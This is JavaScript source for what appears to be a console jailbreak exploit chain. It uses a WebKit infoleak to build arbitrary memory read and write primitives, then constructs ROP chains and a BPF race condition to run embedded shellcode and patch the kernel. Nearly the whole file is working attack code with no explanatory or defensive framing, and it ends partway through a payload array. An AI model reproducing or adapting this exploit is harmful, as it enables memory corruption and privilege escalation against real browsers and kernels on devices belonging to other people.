var p;
var s = {};
var g = {};
var gc = {
  "pop_r8": 96709,
  "pop_r9": 12268047,
  "pop_rax": 17397,
  "pop_rcx": 339545,
  "pop_rdx": 1826852,
  "pop_rsi": 586634,
  "pop_rdi": 232890,
  "pop_rsp": 124551,
  "jmp_rax": 130,
  "jmp_rdi": 2711166,
  "mov_rdx_rax": 3488561,
  "mov_rdi_rax": 22692143,
  "mov_rax_rdx": 1896224,
  "mov_rbp_rsp": 985418,
  "mov__rdi__rax": 3857131,
  "mov__rdi__rsi": 146114,
  "mov__rax__rsi": 2451047,
  "mov_rax__rax__": 444474,
  "mov_rax__rdi__": 290553,
  "add_rax_rsi": 1384646,
  "and_rax_rsi": 22481823,
  "add_rdi_rax": 5593055,
  "jop": 800720,
  "ret": 60,
  "stack_chk_fail": 200,
  "setjmp": 5368
};
window.onerror = function (e) {
  document.getElementById("loader").style.display = "none";
  document.getElementById("fail").style.display = "block";
  if (e.startsWith("Error:") == true) {
    alert(e);
  } else {
    location.reload();
  }
};
var rop = function () {
  this.stack = new Uint32Array(65536);
  this.stackBase = p.read8(p.leakval(this.stack).add32(16));
  this.count = 0;
  this.clear = function () {
    this.count = 0;
    this.runtime = undefined;
    for (var i = 0; i < 4080 / 2; i++) {
      p.write8(this.stackBase.add32(i * 8), 0);
    }
  };
  this.pushSymbolic = function () {
    this.count++;
    return this.count - 1;
  };
  this.finalizeSymbolic = function (idx, val) {
    p.write8(this.stackBase.add32(idx * 8), val);
  };
  this.push = function (val) {
    this.finalizeSymbolic(this.pushSymbolic(), val);
  };
  this.push_write8 = function (where, what) {
    this.push(g.pop_rdi);
    this.push(where);
    this.push(g.pop_rsi);
    this.push(what);
    this.push(g.mov__rdi__rsi);
  };
  this.fcall = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    if (rdi != undefined) {
      this.push(g.pop_rdi);
      this.push(rdi);
    }
    if (rsi != undefined) {
      this.push(g.pop_rsi);
      this.push(rsi);
    }
    if (rdx != undefined) {
      this.push(g.pop_rdx);
      this.push(rdx);
    }
    if (rcx != undefined) {
      this.push(g.pop_rcx);
      this.push(rcx);
    }
    if (r8 != undefined) {
      this.push(g.pop_r8);
      this.push(r8);
    }
    if (r9 != undefined) {
      this.push(g.pop_r9);
      this.push(r9);
    }
    this.push(rip);
    return this;
  };
  this.run = function () {
    var retv = p.loadchain(this, this.notimes);
    this.clear();
    return retv;
  };
  return this;
};
function makeid() {
  var text = "";
  var possible = "ABCDFGHIJKMNOPQRSTUVWXYZLEefulabcdghijkmnopqrstvwxyz0123456789";
  for (var i = 0; i < 8; i++) {
    text += possible.charAt(Math.floor(Math.random() * possible.length));
  }
  return text;
}
var instancespr = [];
for (var i = 0; i < 4096; i++) {
  instancespr[i] = new Uint32Array(1);
  instancespr[i][makeid()] = 50057;
}
var _dview;
function u2d(low, hi) {
  if (!_dview)
    _dview = new DataView(new ArrayBuffer(16));
  _dview.setUint32(0, hi);
  _dview.setUint32(4, low);
  return _dview.getFloat64(0);
}
function zeroFill(number, width) {
  width -= number.toString().length;
  if (width > 0) {
    return new Array(width + (/\./.test(number) ? 2 : 1)).join("0") + number;
  }
  return number + "";
}
function int64(low, hi) {
  this.low = (low >>> 0);
  this.hi = (hi >>> 0);
  this.add32 = function (val) {
    var new_lo = (((this.low >>> 0) + val) & 4294967295) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo < this.low) {
      new_hi++;
    }
    return new int64(new_lo, new_hi);
  };
  this.add32inplace = function (val) {
    var new_lo = (((this.low >>> 0) + val) & 4294967295) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo < this.low) {
      new_hi++;
    }
    this.hi = new_hi;
    this.low = new_lo;
  };
  this.sub32 = function (val) {
    var new_lo = (((this.low >>> 0) - val) & 4294967295) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo > (this.low) & 4294967295) {
      new_hi--;
    }
    return new int64(new_lo, new_hi);
  };
  this.sub32inplace = function (val) {
    var new_lo = (((this.low >>> 0) - val) & 4294967295) >>> 0;
    var new_hi = (this.hi >>> 0);
    if (new_lo > (this.low) & 4294967295) {
      new_hi--;
    }
    this.hi = new_hi;
    this.low = new_lo;
  };
  this.toString = function (val) {
    val = 16;
    var lo_str = (this.low >>> 0).toString(val);
    var hi_str = (this.hi >>> 0).toString(val);
    if (this.hi == 0)
      return lo_str;
    else {
      lo_str = zeroFill(lo_str, 8);
    }
    return hi_str + lo_str;
  };
  return this;
}
var nogc = [];
var tgt = {
  a: 0,
  b: 0,
  c: 0,
  d: 0
};
var y = new ImageData(1, 16384);
postMessage("", "*", [y.data.buffer]);
var props = {};
for (var i = 0; i < 16384 / 2; ) {
  props[i++] = {
    value: 1111638594
  };
  props[i++] = {
    value: tgt
  };
}
var foundLeak = undefined;
var foundIndex = 0;
var maxCount = 256;
while (foundLeak == undefined && maxCount > 0) {
  maxCount--;
  history.pushState(y, "");
  Object.defineProperties({}, props);
  var leak = new Uint32Array(history.state.data.buffer);
  for (var i = 0; i < leak.length - 6; i++) {
    if (leak[i] == 1111638594 && leak[i + 1] == 4294901760 && leak[i + 2] == 0 && leak[i + 3] == 0 && leak[i + 4] == 0 && leak[i + 5] == 0 && leak[i + 6] == 14 && leak[i + 7] == 0 && leak[i + 10] == 0 && leak[i + 11] == 0 && leak[i + 12] == 0 && leak[i + 13] == 0 && leak[i + 14] == 14 && leak[i + 15] == 0) {
      foundIndex = i;
      foundLeak = leak;
      break;
    }
  }
}
if (!foundLeak) {
  throw new Error("infoleak fail");
}
Array.prototype.__defineGetter__(100, () => 1);
var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 64);
var leakJSVal = new int64(firstLeak[8], firstLeak[9]);
var f = document.body.appendChild(document.createElement("iframe"));
var a = new f.contentWindow.Array(13.37, 13.37);
var b = new f.contentWindow.Array(u2d(leakJSVal.low + 16, leakJSVal.hi), 13.37);
var master = new Uint32Array(4096);
var slave = new Uint32Array(4096);
var leakval_u32 = new Uint32Array(4096);
var leakval_helper = [slave, 2, 3, 4, 5, 6, 7, 8, 9, 10];
tgt.a = u2d(2048, 23077632);
tgt.b = 0;
tgt.c = leakval_helper;
tgt.d = 4919;
var c = Array.prototype.concat.call(a, b);
document.body.removeChild(f);
var hax = c[0];
c[0] = 0;
tgt.c = c;
hax[2] = 0;
hax[3] = 0;
Object.defineProperty(Array.prototype, 100, {
  get: undefined
});
tgt.c = leakval_helper;
var butterfly = new int64(hax[2], hax[3]);
butterfly.low += 16;
tgt.c = leakval_u32;
var lkv_u32_old = new int64(hax[4], hax[5]);
hax[4] = butterfly.low;
hax[5] = butterfly.hi;
tgt.c = master;
hax[4] = leakval_u32[0];
hax[5] = leakval_u32[1];
var a2sb = new int64(master[4], master[5]);
tgt.c = leakval_u32;
hax[4] = lkv_u32_old.low;
hax[5] = lkv_u32_old.hi;
tgt.c = 0;
hax = 0;
var p = {
  write8: function (addr, val) {
    master[4] = addr.low;
    master[5] = addr.hi;
    if (val instanceof int64) {
      slave[0] = val.low;
      slave[1] = val.hi;
    } else {
      slave[0] = val;
      slave[1] = 0;
    }
    master[4] = a2sb.low;
    master[5] = a2sb.hi;
  },
  write4: function (addr, val) {
    master[4] = addr.low;
    master[5] = addr.hi;
    slave[0] = val;
    master[4] = a2sb.low;
    master[5] = a2sb.hi;
  },
  read8: function (addr) {
    master[4] = addr.low;
    master[5] = addr.hi;
    var rtv = new int64(slave[0], slave[1]);
    master[4] = a2sb.low;
    master[5] = a2sb.hi;
    return rtv;
  },
  read4: function (addr) {
    master[4] = addr.low;
    master[5] = addr.hi;
    var rtv = slave[0];
    master[4] = a2sb.low;
    master[5] = a2sb.hi;
    return rtv;
  },
  leakval: function (jsval) {
    leakval_helper[0] = jsval;
    var rtv = this.read8(butterfly);
    this.write8(butterfly, new int64(1094795585, 4294901760));
    return rtv;
  }
};
var get_jmptgt = function (addr) {
  var z = p.read4(addr) & 65535;
  var y = p.read4(addr.add32(2));
  if (z != 9727)
    return 0;
  return addr.add32(y + 6);
};
var exploit = function () {
  p.leakfunc = function (func) {
    var fptr_store = p.leakval(func);
    return (p.read8(fptr_store.add32(24))).add32(64);
  };
  var parseFloatStore = p.leakfunc(parseFloat);
  var webKitBase = p.read8(parseFloatStore);
  webKitBase.low &= 4294963200;
  webKitBase.sub32inplace(5881856 - 147456);
  var o2wk = function (o) {
    return webKitBase.add32(o);
  };
  for (var gn in gc) {
    if (gc.hasOwnProperty(gn)) {
      g[gn] = o2wk(gc[gn]);
    }
  }
  var libKernelBase = p.read8(get_jmptgt(g.stack_chk_fail));
  libKernelBase.low &= 4294963200;
  libKernelBase.sub32inplace(53248 + 16384);
  var wkview = new Uint8Array(4096);
  var wkstr = p.leakval(wkview).add32(16);
  p.write8(wkstr, webKitBase);
  p.write4(wkstr.add32(8), 57131008);
  var hold1;
  var hold2;
  var holdz;
  var holdz1;
  while (1) {
    hold1 = {
      a: 0,
      b: 0,
      c: 0,
      d: 0
    };
    hold2 = {
      a: 0,
      b: 0,
      c: 0,
      d: 0
    };
    holdz1 = p.leakval(hold2);
    holdz = p.leakval(hold1);
    if (holdz.low - 48 == holdz1.low)
      break;
  }
  var pushframe = [];
  pushframe.length = 128;
  var funcbuf;
  var funcbuf32 = new Uint32Array(256);
  nogc.push(funcbuf32);
  var launch_chain = function (chain) {
    var stackPointer = 0;
    var stackCookie = 0;
    var orig_reenter_rip = 0;
    var reenter_help = {
      length: {
        valueOf: function () {
          orig_reenter_rip = p.read8(stackPointer);
          stackCookie = p.read8(stackPointer.add32(8));
          var returnToFrame = stackPointer;
          var ocnt = chain.count;
          chain.push_write8(stackPointer, orig_reenter_rip);
          chain.push_write8(stackPointer.add32(8), stackCookie);
          if (chain.runtime)
            returnToFrame = chain.runtime(stackPointer);
          chain.push(g.pop_rsp);
          chain.push(returnToFrame);
          chain.count = ocnt;
          p.write8(stackPointer, (g.pop_rsp));
          p.write8(stackPointer.add32(8), chain.stackBase);
        }
      }
    };
    funcbuf = p.read8(p.leakval(funcbuf32).add32(16));
    p.write8(funcbuf.add32(48), g.setjmp);
    p.write8(funcbuf.add32(128), g.jop);
    p.write8(funcbuf, funcbuf);
    p.write8(parseFloatStore, g.jop);
    var orig_hold = p.read8(holdz1);
    var orig_hold48 = p.read8(holdz1.add32(72));
    p.write8(holdz1, funcbuf.add32(80));
    p.write8(holdz1.add32(72), funcbuf);
    parseFloat(hold2, hold2, hold2, hold2, hold2, hold2);
    p.write8(holdz1, orig_hold);
    p.write8(holdz1.add32(72), orig_hold48);
    stackPointer = p.read8(funcbuf.add32(16));
    rtv = Array.prototype.splice.apply(reenter_help);
    return p.leakval(rtv);
  };
  p.loadchain = launch_chain;
  var kview = new Uint8Array(4096);
  var kstr = p.leakval(kview).add32(16);
  p.write8(kstr, libKernelBase);
  p.write4(kstr.add32(8), 262144);
  var countbytes;
  for (var i = 0; i < 262144; i++) {
    if (kview[i] == 114 && kview[i + 1] == 100 && kview[i + 2] == 108 && kview[i + 3] == 111 && kview[i + 4] == 99) {
      countbytes = i;
      break;
    }
  }
  p.write4(kstr.add32(8), countbytes + 32);
  var dview32 = new Uint32Array(1);
  var dview8 = new Uint8Array(dview32.buffer);
  for (var i = 0; i < countbytes; i++) {
    if (kview[i] == 72 && kview[i + 1] == 199 && kview[i + 2] == 192 && kview[i + 7] == 73 && kview[i + 8] == 137 && kview[i + 9] == 202 && kview[i + 10] == 15 && kview[i + 11] == 5) {
      dview8[0] = kview[i + 3];
      dview8[1] = kview[i + 4];
      dview8[2] = kview[i + 5];
      dview8[3] = kview[i + 6];
      var syscallno = dview32[0];
      s[syscallno] = libKernelBase.add32(i);
    }
  }
  var chain = new rop();
  var returnvalue;
  p.fcall_ = function (rip, rdi, rsi, rdx, rcx, r8, r9) {
    chain.clear();
    chain.notimes = this.next_notime;
    this.next_notime = 1;
    chain.fcall(rip, rdi, rsi, rdx, rcx, r8, r9);
    chain.push(g.pop_rdi);
    chain.push(chain.stackBase.add32(16376));
    chain.push(g.mov__rdi__rax);
    chain.push(g.pop_rax);
    chain.push(p.leakval(1094795842));
    if (chain.run().low != 1094795842) {
      throw new Error("unexpected rop behaviour");
    }
    returnvalue = p.read8(chain.stackBase.add32(16376));
  };
  p.fcall = function () {
    p.fcall_.apply(this, arguments);
    return returnvalue;
  };
  p.readstr = function (addr) {
    var addr_ = addr.add32(0);
    var rd = p.read4(addr_);
    var buf = "";
    while (rd & 255) {
      buf += String.fromCharCode(rd & 255);
      addr_.add32inplace(1);
      rd = p.read4(addr_);
    }
    return buf;
  };
  p.syscall = function (sysc, rdi, rsi, rdx, rcx, r8, r9) {
    if (typeof sysc != "number") {
      throw new Error("invalid syscall");
    }
    var off = s[sysc];
    if (off == undefined) {
      throw new Error("invalid syscall");
    }
    return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
  };
  p.sptr = function (str) {
    var bufView = new Uint8Array(str.length + 1);
    for (var i = 0; i < str.length; i++) {
      bufView[i] = str.charCodeAt(i) & 255;
    }
    nogc.push(bufView);
    return p.read8(p.leakval(bufView).add32(16));
  };
  p.malloc = function (sz) {
    var backing = new Uint8Array(65536 + sz);
    nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(16));
    ptr.backing = backing;
    return ptr;
  };
  p.malloc32 = function (sz) {
    var backing = new Uint8Array(65536 + sz * 4);
    nogc.push(backing);
    var ptr = p.read8(p.leakval(backing).add32(16));
    ptr.backing = new Uint32Array(backing.buffer);
    return ptr;
  };
  var test = p.syscall(23, 0);
  if (test != "0") {
    var fd = p.syscall(5, p.sptr("/dev/bpf0"), 2).low;
    var fd1 = p.syscall(5, p.sptr("/dev/bpf0"), 2).low;
    if (fd == (-1 >>> 0)) {
      throw new Error("open bpf fail");
    }
    var bpf_valid = p.malloc32(16384);
    var bpf_spray = p.malloc32(16384);
    var bpf_valid_u32 = bpf_valid.backing;
    var bpf_valid_prog = p.malloc(64);
    p.write8(bpf_valid_prog, 2048 / 8);
    p.write8(bpf_valid_prog.add32(8), bpf_valid);
    var bpf_spray_prog = p.malloc(64);
    p.write8(bpf_spray_prog, 2048 / 8);
    p.write8(bpf_spray_prog.add32(8), bpf_spray);
    for (var i = 0; i < 1024; ) {
      bpf_valid_u32[i++] = 6;
      bpf_valid_u32[i++] = 0;
    }
    var rtv = p.syscall(54, fd, 2148549243, bpf_valid_prog);
    if (rtv.low != 0) {
      throw new Error("ioctl bpf fail");
    }
    var spawnthread = function (name, chain) {
      var longjmp = webKitBase.add32(5352);
      var createThread = webKitBase.add32(7836560);
      var contextp = p.malloc32(8192);
      var contextz = contextp.backing;
      contextz[0] = 1337;
      var thread2 = new rop();
      thread2.push(g.ret);
      thread2.push(g.ret);
      thread2.push(g.ret);
      thread2.push(g.ret);
      chain(thread2);
      p.write8(contextp, g.ret);
      p.write8(contextp.add32(16), thread2.stackBase);
      p.syscall(324, 1);
      var retv = function () {
        p.fcall(createThread, longjmp, contextp, p.sptr(name));
      };
      nogc.push(contextp);
      nogc.push(thread2);
      return retv;
    };
    var interrupt1,
    loop1;
    var sock = p.syscall(97, 2, 2);
    var kscratch = p.malloc32(4096);
    var start1 = spawnthread("GottaGoFast", function (thread2) {
        interrupt1 = thread2.stackBase;
        thread2.push(g.ret);
        thread2.push(g.ret);
        thread2.push(g.ret);
        thread2.push(g.pop_rdi);
        thread2.push(fd);
        thread2.push(g.pop_rsi);
        thread2.push(2148549243);
        thread2.push(g.pop_rdx);
        thread2.push(bpf_valid_prog);
        thread2.push(g.pop_rsp);
        thread2.push(thread2.stackBase.add32(2048));
        thread2.count = 256;
        var cntr = thread2.count;
        thread2.push(s[54]);
        thread2.push_write8(thread2.stackBase.add32(cntr * 8), s[54]);
        thread2.push(g.pop_rdi);
        var wherep = thread2.pushSymbolic();
        thread2.push(g.pop_rsi);
        var whatp = thread2.pushSymbolic();
        thread2.push(g.mov__rdi__rsi);
        thread2.push(g.pop_rsp);
        loop1 = thread2.stackBase.add32(thread2.count * 8);
        thread2.push(1094795585);
        thread2.finalizeSymbolic(wherep, loop1);
        thread2.finalizeSymbolic(whatp, loop1.sub32(8));
      });
    var krop = new rop();
    var race = new rop();
    var ctxp = p.malloc32(8192);
    var ctxp1 = p.malloc32(8192);
    var ctxp2 = p.malloc32(8192);
    p.write8(bpf_spray.add32(16), ctxp);
    p.write8(ctxp.add32(80), 0);
    p.write8(ctxp.add32(104), ctxp1);
    var stackshift_from_retaddr = 0;
    p.write8(ctxp1.add32(16), o2wk(19536333));
    stackshift_from_retaddr += 8 + 88;
    p.write8(ctxp.add32(0), ctxp2);
    p.write8(ctxp.add32(16), ctxp2.add32(8));
    p.write8(ctxp2.add32(2000), o2wk(7271653));
    var iterbase = ctxp2;
    for (var i = 0; i < 15; i++) {
      p.write8(iterbase, o2wk(19536333));
      stackshift_from_retaddr += 8 + 88;
      p.write8(iterbase.add32(2000 + 32), o2wk(7271653));
      p.write8(iterbase.add32(8), iterbase.add32(32));
      p.write8(iterbase.add32(24), iterbase.add32(32 + 8));
      iterbase = iterbase.add32(32);
    }
    var raxbase = iterbase;
    var rdibase = iterbase.add32(8);
    var memcpy = get_jmptgt(webKitBase.add32(248));
    memcpy = p.read8(memcpy);
    p.write8(raxbase, o2wk(22848539));
    stackshift_from_retaddr += 8;
    p.write8(rdibase.add32(112), o2wk(19417140));
    stackshift_from_retaddr += 8;
    p.write8(rdibase.add32(24), rdibase);
    p.write8(rdibase.add32(8), krop.stackBase);
    p.write8(raxbase.add32(48), g.mov_rbp_rsp);
    p.write8(rdibase, raxbase);
    p.write8(raxbase.add32(1056), o2wk(2566497));
    p.write8(raxbase.add32(64), memcpy.add32(194 - 144));
    var topofchain = stackshift_from_retaddr + 40;
    p.write8(rdibase.add32(176), topofchain);
    for (var i = 0; i < 4096 / 8; i++) {
      p.write8(krop.stackBase.add32(i * 8), g.ret);
    }
    krop.count = 16;
    var kpatch = function (offset, qword) {
      krop.push(g.pop_rax);
      krop.push(kscratch);
      krop.push(g.mov_rax__rax__);
      krop.push(g.pop_rsi);
      krop.push(offset);
      krop.push(g.add_rax_rsi);
      krop.push(g.pop_rsi);
      krop.push(qword);
      krop.push(g.mov__rax__rsi);
    };
    var kpatch2 = function (offset, offset2) {
      krop.push(g.pop_rax);
      krop.push(kscratch);
      krop.push(g.mov_rax__rax__);
      krop.push(g.pop_rsi);
      krop.push(offset);
      krop.push(g.add_rax_rsi);
      krop.push(g.mov_rdi_rax);
      krop.push(g.pop_rax);
      krop.push(kscratch);
      krop.push(g.mov_rax__rax__);
      krop.push(g.pop_rsi);
      krop.push(offset2);
      krop.push(g.add_rax_rsi);
      krop.push(g.mov__rdi__rax);
    };
    p.write8(kscratch.add32(1056), g.pop_rdi);
    p.write8(kscratch.add32(64), g.pop_rax);
    p.write8(kscratch.add32(24), kscratch);
    krop.push(g.pop_rdi);
    krop.push(kscratch.add32(24));
    krop.push(g.mov_rbp_rsp);
    var rboff = topofchain - krop.count * 8 + 40;
    krop.push(o2wk(2566497));
    krop.push(g.pop_rax);
    krop.push(rboff);
    krop.push(g.add_rdi_rax);
    krop.push(g.mov_rax__rdi__);
    krop.push(g.pop_rsi);
    krop.push(762);
    krop.push(g.add_rax_rsi);
    krop.push(g.mov__rdi__rax);
    var shellbuf = p.malloc32(4096);
    krop.push(g.pop_rdi);
    krop.push(kscratch);
    krop.push(g.mov__rdi__rax);
    krop.push(g.pop_rsi);
    krop.push(808116);
    krop.push(g.add_rax_rsi);
    krop.push(g.pop_rdi);
    krop.push(kscratch.add32(8));
    krop.push(g.mov__rdi__rax);
    krop.push(g.jmp_rax);
    krop.push(g.pop_rdi);
    krop.push(kscratch.add32(16));
    krop.push(g.mov__rdi__rax);
    krop.push(g.pop_rsi);
    krop.push(new int64(4294901759, 4294967295));
    krop.push(g.and_rax_rsi);
    krop.push(g.mov_rdx_rax);
    krop.push(g.pop_rax);
    krop.push(kscratch.add32(8));
    krop.push(g.mov_rax__rax__);
    krop.push(g.pop_rsi);
    krop.push(9);
    krop.push(g.add_rax_rsi);
    krop.push(g.mov_rdi_rax);
    krop.push(g.mov_rax_rdx);
    krop.push(g.jmp_rdi);
    krop.push(g.pop_rax);
    krop.push(kscratch);
    krop.push(g.mov_rax__rax__);
    krop.push(g.pop_rsi);
    krop.push(221338);
    krop.push(g.add_rax_rsi);
    krop.push(g.mov_rax__rax__);
    krop.push(g.pop_rdi);
    krop.push(kscratch.add32(816));
    krop.push(g.mov__rdi__rax);
    kpatch(221338, new int64(2425420344, 2425393296));
    kpatch(20169540, shellbuf);
    kpatch(new int64(4293816070, 4294967295), new int64(184, 3297329408));
    kpatch(new int64(4293470503, 4294967295), new int64(0, 1082624841));
    kpatch(new int64(4293470533, 4294967295), new int64(2425388523, 1922076816));
    kpatch(new int64(4294769332, 4294967295), new int64(934690871, 826654769));
    kpatch(828366, new int64(233, 2336788480));
    kpatch(1329844, new int64(2428747825, 2425393296));
    kpatch(new int64(15789236, 0), new int64(2, 0));
    kpatch2(new int64(15789244, 0), new int64(4293548276, 4294967295));
    kpatch(new int64(15789276, 0), new int64(0, 1));
    krop.push(g.pop_rax);
    krop.push(kscratch.add32(8));
    krop.push(g.mov_rax__rax__);
    krop.push(g.pop_rsi);
    krop.push(9);
    krop.push(g.add_rax_rsi);
    krop.push(g.mov_rdi_rax);
    krop.push(g.pop_rax);
    krop.push(kscratch.add32(16));
    krop.push(g.mov_rax__rax__);
    krop.push(g.jmp_rdi);
    krop.push(o2wk(380345));
    krop.push(kscratch.add32(4096));
    var kq = p.malloc32(16);
    var kev = p.malloc32(256);
    kev.backing[0] = sock;
    kev.backing[2] = 131071;
    kev.backing[3] = 1;
    kev.backing[4] = 5;
    var shcode = [35817, 2425393152, 2425393296, 2425393296, 8567125, 2303246336, 1096172005, 1398030677, 2303275535, 3149957588, 256, 551862601, 1220806985, 9831821, 2370371584, 4265616532, 2370699263, 3767542964, 2370633744, 1585456300, 2169045059, 1265721540, 277432321, 4202255, 698, 3867757568, 524479, 3607052544, 960335176, 1207959552, 3224487561, 2211839809, 3698655723, 1103114587, 1096630620, 2428722526, 1032669269, 4294967160, 2303260209, 15293925, 1207959552, 770247, 2303262720, 3271888842, 1818324331, 979595116, 628633632, 1815490864, 2648, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0];
    for (var i = 0; i < shcode.length; i++) {
      shellbuf.backing[i] = shcode[i];
    }
    start1();
    while (1) {
      race.count = 0;
      race.push(s[362]);
      race.push(g.pop_rdi);
      race.push(kq);
      race.push(g.mov__rdi__rax);
      race.push(g.ret);
      race.push(g.ret);
      race.push(g.ret);
      race.push(g.ret);
      race.push_write8(loop1, interrupt1);
      race.push(g.pop_rdi);
      race.push(fd);
      race.push(g.pop_rsi);
      race.push(2148549243);
      race.push(g.pop_rdx);
      race.push(bpf_valid_prog);
      race.push(s[54]);
      race.push(g.pop_rax);
      race.push(kq);
      race.push(g.mov_rax__rax__);
      race.push(g.mov_rdi_rax);
      race.push(g.pop_rsi);
      race.push(kev);
      race.push(g.pop_rdx);
      race.push(1);
      race.push(g.pop_rcx);
      race.push(0);
      race.push(g.pop_r8);
      race.push(0);
      race.push(s[363]);
      race.push(g.pop_rdi);
      race.push(fd1);
      race.push(g.pop_rsi);
      race.push(2148549243);
      race.push(g.pop_rdx);
      race.push(bpf_spray_prog);
      race.push(s[54]);
      race.push(g.pop_rax);
      race.push(kq);
      race.push(g.mov_rax__rax__);
      race.push(g.mov_rdi_rax);
      race.push(s[6]);
      race.run();
      if (kscratch.backing[0] != 0) {
        p.syscall(74, shellbuf, 16384, 7);
        p.fcall(shellbuf);
        break;
      }
    }
    var createThread = webKitBase.add32(7836560);
    var payloadbuf = p.malloc32(16384);
    var payload = [141289, 3224455168, 264931657, 3271651845, 4031304, 26, 4283439220, 1701653, 143218944, 4290824008, 1224736767, 4294951623, 1405353983, 1224378696, 33614977, 2370306048, 1625909, 3884533760, 369082417, 6624, 3219556680, 222, 431101439, 2168979456, 131268, 1103321856, 1096171863, 1431585109, 3968026707, 8567064, 839892992, 1221691720, 1208505995, 1210114497, 2370357257, 749973640, 847989762, 608995656, 1653296136, 4135931144, 24413199, 2202599424, 2249132028, 362, 1083739464, 1291845630, 785430669, 2370306094, 3052236968, 1488472064, 1280262468, 1229996377, 2232354361, 322, 138906440, 1213238088, 1077971784, 411601736, 3338665985, 1088, 1086783488, 8, 339789568, 0, 455, 2336751616, 159817867, 1216956417, 2206943280, 36444784, 541231432, 407013704, 814189384, 1207959553, 5055, 16777216, 1086801976, 4294967136, 2022263039, 1086802008, 4294967144, 537870847, 3901312197, 4294911304, 571473918, 2961426112, 106190, 109480832, 2148794829, 3439765899, 4130407169, 111840128, 1208025549, 2340482953, 30213832, 1073789441, 2210856960, 5214280, 0, 2707194823, 79, 2210856960, 6956800, 2428747825, 2997912519, 28311652, 2210894019, 6599376, 2428699056, 409867775, 2303459328, 4136193250, 4293888328, 1589013, 3565405696, 3942657584, 630492490, 16383, 1223592264, 136608907, 14844232, 1224736704, 3221284481, 129630207, 1090519040, 2210846719, 3027156, 571425141, 3934865605, 139854665, 415531848, 1572876635, 1564564545, 1598119489, 2202591999, 3364034756, 1096637439, 1096630620, 3277799774, 686588744, 45544, 19589120, 2370306048, 110341, 1149847552, 92999716, 5828, 608471368, 4290785560, 1556245, 1955416064, 2370310180, 4294836797, 51199, 3892314112, 56, 175423621, 369082417, 6044, 1149829259, 971508772, 1207959553, 378092941, 2699558912, 2348810237, 1208755268, 3274228867, 180406088, 3909091328, 4294966624, 197183304, 3909091328, 4294966612, 2294335304, 3909091328, 4294966600, 1338033992, 3909091330, 4294966588, 1358006600, 2303250993, 3224454654, 152255, 3904909568, 4294966561, 1213449050, 373308813, 2202533888, 3343388908, 1514245, 0, 1552762880, 2303200292, 4290963678, 3230007295, 2303206004, 1032669406, 5669, 4294946792, 1958774271, 3733538831, 624790856, 3892314134, 4294967196, 203717771, 3709177160, 1207959574, 371275149, 2045247488, 2348810239, 1208755324, 382604685, 2370306048, 1446453, 4284672000, 2202599423, 3277525188, 3375449427, 834679109, 835858889, 1032669430, 5644, 379721215, 2370306048, 1483541, 898451456, 5648, 3347694473, 4294913000, 1222609407, 376051085, 2370306048, 1441333, 4279691264, 3750363135, 361580635, 5756, 4013264200, 3909091349, 4294967040, 827377969, 1224094162, 367279501, 826605568, 3224454601, 373691903, 1213792256, 372118925, 2370306048, 1437493, 3922168064, 4294966992, 1329677400, 1346459980, 3431, 0, 1946697603, 1428553478, 2332033045, 3246987335, 1964566977, 2177010160, 201326818, 16417024, 1962937344, 947880416, 4919, 4280670069, 2315254783, 3224442951, 1220643144, 280827277, 4148690944, 286558937, 940004488, 1220607816, 1964046467, 1101982691, 1096171863, 1431585109, 3968026707, 4253632808, 1106676041, 2303317897, 2336777676, 9516, 2370306048, 3121357916, 20, 836733256, 2165702646, 1140850709, 203717769, 75205960, 3136719180, 16, 359798271, 2336751616, 1387317, 4018751488, 369087025, 5432, 1223264588, 2303516297, 548946407, 3120562176, 20, 342758911, 2336751616, 1376053, 4018751488, 352720383, 2202533888, 1566255300, 1564564545, 1598119489, 1096237507, 1096106326, 1213420884, 29420673, 2303262720, 612666365, 536, 611617096, 3029025800, 135204, 3548989440, 2337685840, 35136644, 4283432960, 35136692, 3036610560, 137252, 1955284992, 369045540, 5184, 818185032, 2302787717, 3867414468, 1157627906, 2232415877, 733, 611093832, 1224093984, 280686473, 1275068416, 807695501, 612142412, 2568355664, 1207959572, 539253897, 3343447601, 2630724, 1275068417, 280688521, 4278190080, 1342229, 1150110720, 2303488036, 1211114620, 941900999, 32, 18618, 1291202816, 2303510409, 4278723652, 1331989, 93145088, 4428, 612665672, 144, 3171257672, 1207959568, 2552530057, 1207959552, 271451533, 2303197184, 10495108, 2370306048, 1023749, 2223589376, 43044, 93145088, 3856, 612665672, 176, 478890085, 37, 898320384, 5056, 2303250993, 3440771039, 1275068435, 136594571, 1224182092, 2303520393, 555089858, 1207959571, 328873355, 2303197184, 3330884063, 329127423, 2235891712, 3800371190, 1207959553, 325467531, 2370568192, 12068020, 4130406400, 328603135, 4130406400, 31930, 4152970240, 611093832, 2434137920, 1207959571, 4028925067, 1291845633, 1275352717, 29020553, 1275068416, 2303524745, 1209017428, 225285, 2227660288, 47140, 1209218816, 2303248009, 1711809604, 3122955463, 536870912, 4254459904, 2336817151, 1249077, 1221734656, 369090441, 4892, 280688177, 1207959552, 369094537, 4908, 609520460, 2144784, 2303262720, 2159559145, 1207959552, 233966989, 2303459328, 3616099542, 306583039, 2336751616, 1230645, 3750316032, 270812297, 315233791, 1418395648, 3531935780, 15500559, 2370306048, 20194436, 4130406400, 31930, 3347662848, 608471368, 3373661968, 1207959570, 270812299, 698, 1955284992, 2303461412, 2227660543, 78884, 1712535296, 908362951, 536870913, 1351437312, 3515436036, 609519948, 4242139160, 2336817151, 1200949, 1221734656, 369090441, 4704, 2303260209, 1096431, 369033216, 4720, 609520460, 3918088472, 8435777, 2370306048, 867085, 2144768, 2303459328, 3616099542, 294262271, 2336751616, 1182517, 3750316032, 369083785, 4624, 980807045, 1290701132, 369096585, 4488, 108314757, 8227649, 2336758251, 2336760884, 4279247996, 1142549, 1958774016, 76236832, 2201520932, 108331007, 291640831, 2336751616, 1155901, 3574988544, 3942645777, 1032538128, 4500, 4293144901, 1164053, 3296806912, 440, 1541441860, 1096565085, 1096696157, 3224486751, 1962902856, 93014037, 4464, 1207995208, 108314757, 544750408, 1438904949, 3968026707, 2089371672, 1214580772, 2436235, 1207959552, 290862475, 3526426624, 4293888328, 1139477, 1284197376, 3091269668, 128, 1628278088, 3120562188, 144, 